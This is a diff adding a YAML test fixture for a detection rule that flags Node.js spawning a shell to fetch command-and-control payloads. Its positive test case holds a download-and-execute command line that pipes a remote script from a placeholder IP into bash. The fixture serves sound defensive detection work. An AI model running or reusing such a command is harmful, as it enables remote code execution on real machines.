@@ -1,0 +1,24 @@
+rule: detections/rules/waterplum_dev_node_python_c2_spawn.yaml
+table: DeviceProcessEvents
+positive_cases:
+  - name: Node.js spawning shell to download and execute remote payload
+    rows:
+      - Timestamp: "2026-10-15T13:00:00Z"
+        DeviceId: "00000000-0000-0000-0000-000000000013"
+        DeviceName: "dev-mac-04.example.local"
+        AccountName: "devuser"
+        InitiatingProcessFileName: "node"
+        FileName: "sh"
+        ProcessCommandLine: "sh -c 'curl -s https://198.51.100.99/init.js | bash'"
+        ReportId: 13001
+negative_cases:
+  - name: Node.js running benign git status check
+    rows:
+      - Timestamp: "2026-10-15T13:05:00Z"
+        DeviceId: "00000000-0000-0000-0000-000000000013"
+        DeviceName: "dev-mac-04.example.local"
+        AccountName: "devuser"
+        InitiatingProcessFileName: "node"
+        FileName: "sh"
+        ProcessCommandLine: "sh -c 'git rev-parse HEAD'"
+        ReportId: 13002
